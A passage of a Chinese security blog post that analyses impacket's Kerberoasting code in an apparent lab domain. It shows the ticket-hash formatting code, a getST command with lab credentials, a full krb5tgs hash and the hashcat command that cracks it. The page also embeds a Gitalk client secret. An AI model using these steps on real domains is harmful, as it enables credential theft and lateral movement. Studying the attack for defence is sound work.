(RC4-HMAC) the cipher part is like:</span></span><br><span class="line">        <span class="comment"># struct EDATA &#123;</span></span><br><span class="line">        <span class="comment">#       struct HEADER &#123;</span></span><br><span class="line">        <span class="comment">#               OCTET Checksum[16];</span></span><br><span class="line">        <span class="comment">#               OCTET Confounder[8];</span></span><br><span class="line">        <span class="comment">#       &#125; Header;</span></span><br><span class="line">        <span class="comment">#       OCTET Data[0];</span></span><br><span class="line">        <span class="comment"># &#125; edata;</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># In short, we&#x27;re interested in splitting the checksum and the rest of the encrypted data</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)</span></span><br><span class="line">        <span class="comment"># last 12 bytes of the encrypted ticket represent the checksum of the decrypted </span></span><br><span class="line">        <span class="comment"># ticket</span></span><br><span class="line">        <span class="keyword">if</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.rc4_hmac.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$*%s$%s$%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:<span class="number">16</span>].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][<span class="number">16</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$%s$%s$*%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][-<span class="number">12</span>:].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:-<span class="number">12</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$%s$%s$*%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][-<span class="number">12</span>:].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:-<span class="number">12</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.des_cbc_md5.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$*%s$%s$%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:<span class="number">16</span>].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][<span class="number">16</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Skipping %s/%s due to incompatible e-type %d&#x27;</span> % (</span><br><span class="line">                decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;sname&#x27;</span>][<span class="string">&#x27;name-string&#x27;</span>][<span class="number">0</span>], decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;sname&#x27;</span>][<span class="string">&#x27;name-string&#x27;</span>][<span class="number">1</span>],</span><br><span class="line">                decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.__saveTGS <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># Save the ticket</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;About to save TGS for %s&#x27;</span> % username)</span><br><span class="line">            ccache = CCache()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ccache.fromTGS(tgs, oldSessionKey, sessionKey)</span><br><span class="line">                ccache.saveFile(<span class="string">&#x27;%s.ccache&#x27;</span> % username)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="built_in">str</span>(e))</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+<p>接下来就可以获取<code>SPN</code>的ST了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python getST.py xiaorang.lab/zhangjian:i9XDE02pLVf -dc-ip 172.22.9.7 -spn TERMSERV/win2016.xiaorang.lab</span><br></pre></td></tr></table></figure></p>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        点击显/隐内容
+    </div>
+    <div class="spoiler-content">
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*$XIAORANG.LAB$*$0ce89c5a5440709db8cd0da786ab1ed5$c4b6d477aac038b4958157e55377f91b03788e4173db8c5df6cb3d95a8e2f9d78bd486af0df68960aec23e52ec2a4c9ca7707318d08d9a3c995ab0c70042f2b4c7c7ea9fc269bb31a76597692ca7f2774283d90c3f19f280236fa6c12ec7d52da1c6f24fb7f2a508ba8bb3fcafb4a669bc6856e567ec6d96d82c42600d07aa5fd68a0b298a3964525bdb77d1227df64a9a92a1aeeafacbf5238c92a156450dd934ed5e7bd6b9b8a965e6d522b6c7501ae49d95818aad9304aeb54e75824f02ef3a8855212ecffd272507308ab996b14dd648c7828962995b249c44a74ddacde8ada0f58c7f84d09b2914f48464aa8f02ea129737c3ebe277e39743184c6715967a64feec56aa174d065151fbd36b3d655d7fb7dae66830efa59798023522e6d40d2e17c5d3465609af7df0a61ea66961256455a51405c6162efdab3c29148ff3bdff77923dafec9647b6bb992ba3bd981a0bf60b2f1629cce9bf9f4e2a3dbd62ff21c10a0f5eba667fc8649c2d1eab273c023209e7273bd7eeef39ffd32889ff2467b866e6b454e7bb2b750065ed6b3ddb75a3a0cf6234ed26eab8ed9bd00e685a40036725cfd6416e1c607c91981e19bb71f27d78365756c0e2d0da57166799058b22a7d507b2413191be7a36a887464d6849a18555a9d0b087dd334d9c05687e3d7519110463f4c9d916627f35aa20059dd57b9d35024aa3d716fc20a7c1b4b9d8756c4a9a6aafd81b07033347c718fc23a51b6919c5dded962e0e7e426fd06c15b61feacb3aa9a8d040b74b38e2f333cf3522509e18dd77cd2e3a743084e0dff25ca1d3547cf91575aedd74541bdaa1a96399983b39b12221f157c3ccdfec099b1ba638fbde2a563683d11fe7d5844b13e6d800f0fdcc59056c747b691c5083469f576bac3f4960c176b3e84a74905ef7cb73942e8514cbb00dd2ee74935917c1fe3ff289936eba9aeb1233069f138e623f8593ec37a145148e5320f3ecc0ca06a7107f93d8d7d2f6ed29f03e3a1f547dc7637b40c424e5357f95ddf19d24dcb67ce9a8c166b3c5b28ed9d4da1cae1762c4dda158a8ef06cd4153d9f0eb6fbe695d105bce8e0270e3a24b01156a87e729b5c87fec57f08f91428d3652e5227903665d41fffec8a41b5ddd4426fb3324066af683a86c1bca6e1cc82b04d3a3508bb31e9f5545f63775ed1271c03b498dcad91acc21625bf1b047f7cb9989b8cca254219d85d804ccb51814c538762f5474d44411d9c411b1f99682c0892c6f95e149c6c1fb186486e1e1400b0d888c1b94b3d659ec30e45af95dee0d7e3835b457c8d0a9f7d81c1b9bdc636673972f56118706e56f44238fad032c9e4c2ff906a3483c1437e449f82da86bb88a82be824501940284c59b3e62bcfc5a94faece71397c906b680f122c3c3755811371bf183f018aa927834662bc6d977424a781074ec440ee46cf7df449eeb215bfbf3037d7f208527a7d929c828f4752d01decf011d0a0aa9746a1b5a64694d04</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+<h2 id="hashcat-爆破"><a href="#hashcat-爆破" class="headerlink" title="hashcat 爆破"></a>hashcat 爆破</h2><p>记得用rockyou爆破<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt pass.txt</span><br></pre></td></tr></table></figure><br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/4.png" alt><br>可以看到密码是@Passw0rd@</p>
+<p>接下来爆破另一个，命令与上面相同，把hash替换一下就行<br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/5.png" alt></p>
+<p>可以看到密码也是一样的</p>
+<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>最后diff一下两个hash，会发现是完全一样的，那么就应该不管是通过请求<code>SPN</code>还是<code>user</code>，都可以获取到相同的hash，所以我应该都是获取到<code>chenchen</code>的这个域用户的hash<br>那么平时说的获取服务的TGS，其实也就是在获取绑定该服务的域用户的hash</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://y4er.com/posts/kerberos-kerberoasting-spn/">https://y4er.com/posts/kerberos-kerberoasting-spn/</a></li>
+</ul>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
+              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/20/python-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="prev" title="python 原型链污染">
+      <i class="fa fa-chevron-left"></i> python 原型链污染
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SPN%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">SPN简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SPN-%E6%A0%BC%E5%BC%8F"><span class="nav-number">3.</span> <span class="nav-text">SPN 格式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GetUserSPNs%E6%BA%90%E7%A0%81%E7%AE%80%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">GetUserSPNs源码简析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetST%E6%BA%90%E7%A0%81%E7%AE%80%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">GetST源码简析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SPN-or-Users"><span class="nav-number">5.</span> <span class="nav-text">SPN or Users</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96SPN"><span class="nav-number">5.1.</span> <span class="nav-text">获取SPN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetUserSPNs"><span class="nav-number">5.2.</span> <span class="nav-text">GetUserSPNs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetST"><span class="nav-number">5.3.</span> <span class="nav-text">GetST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hashcat-%E7%88%86%E7%A0%B4"><span class="nav-number">5.4.</span> <span class="nav-text">hashcat 爆破</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="nav-number">6.</span> <span class="nav-text">结论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kaikaix"
+      src="/images/cat.jpg">
+  <p class="site-author-name" itemprop="name">kaikaix</p>
+  <div class="site-description" itemprop="description">小白</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">41</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kaikaix</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'e015cfd8a7113f83449a',
+      clientSecret: 'ead135fac6fb19fb1953358c28ee9b0dc1625f9a',
+      repo        : 'kaikaix.github.io',
+      owner       : 'kaikaix',
+      admin       : ['kaikaix'],
+      id          : '5a56b593e942a71494c7999384bbe52e',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
